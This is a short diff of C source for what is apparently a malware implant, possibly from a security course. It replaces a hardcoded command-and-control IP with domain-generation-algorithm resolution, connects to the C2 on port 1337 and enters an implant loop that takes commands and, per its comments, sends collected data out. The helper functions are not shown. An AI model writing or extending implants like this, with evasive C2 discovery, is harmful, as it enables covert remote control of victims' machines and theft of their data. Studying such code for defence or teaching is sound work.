@@ -161,16 +161,25 @@ cleanup:
     // Will also parse reponses from C2 and call into appropiate funcitonality + send collected data 
 int main() 
 {
-    const char* ip_address = "172.17.0.3";
+    //const char* ip_address = "172.17.0.3";
+    char* ip_address;
     uint16_t port = 1337;
     int client_fd = 0;
+
+    printf("Generating DGAs and resolving domain names...\n");
+
+    if (!determineC2Address(&ip_address))
+    {
+        printf("Failed to determine C2 address; exiting....\n");
+        return -1;
+    }
 
     printf("Establishing connection to C2...\n");
 
     if (!callout(&client_fd, ip_address, port))
     {
         printf("Failed our callout to C2\n");
-        return 0;
+        return -1;
     }
 
     printf("Successfully connected to C2; starting implant loop...\n");
@@ -178,7 +187,7 @@ int main()
     if (!handleCommands(&client_fd))
     {
         printf("Failed handling commands from C2!\n");
-        
+        return -1;
     }
 
     return 0;
